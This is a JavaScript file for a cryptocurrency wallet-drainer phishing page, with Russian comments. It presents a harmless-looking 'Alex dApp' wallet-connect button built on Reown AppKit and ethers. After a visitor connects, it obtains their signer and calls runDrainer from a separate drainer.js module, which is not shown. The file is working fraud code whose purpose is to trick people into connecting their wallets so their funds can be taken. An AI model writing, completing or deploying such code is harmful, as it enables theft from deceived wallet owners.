import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

// === Конфигурация ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png']
  },
  features: {
    analytics: true,
    email: false,
    socials: false
  },
  allWallets: 'SHOW'
})

// === Основная логика подключения ===
window.addEventListener('DOMContentLoaded', () => {
  const actionBtn = document.getElementById("action-btn")

  // Проверка наличия window.ethereum
  const isInjectedWallet = typeof window.ethereum !== 'undefined'

  if (isInjectedWallet) {
    actionBtn.style.display = "inline-block"
    actionBtn.addEventListener('click', connectWithInjected)
  } else {
    actionBtn.style.display = "inline-block"
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal()
    })
  }
})

// === Подключение через window.ethereum и AppKit ===
async function connectWithInjected() {
  try {
    await appKitModal.open()

    const address = await waitForWallet()
    console.log('✅ Кошелёк подключён:', address)

    const provider = new ethers.providers.Web3Provider(window.ethereum)
    const signer = provider.getSigner()

    await runDrainer(provider, signer, address)
    console.log('🚀 Контракт успешно вызван')
  } catch (err) {
    console.error('❌ Ошибка при подключении или вызове контракта:', err)
  }
}

// === Ожидание подключения кошелька ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' })
  if (accounts.length > 0) return accounts[0]

  return new Promise(resolve => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' })
      if (accounts.length > 0) {
        clearInterval(interval)
        resolve(accounts[0])
      }
    }, 500)
  })
}
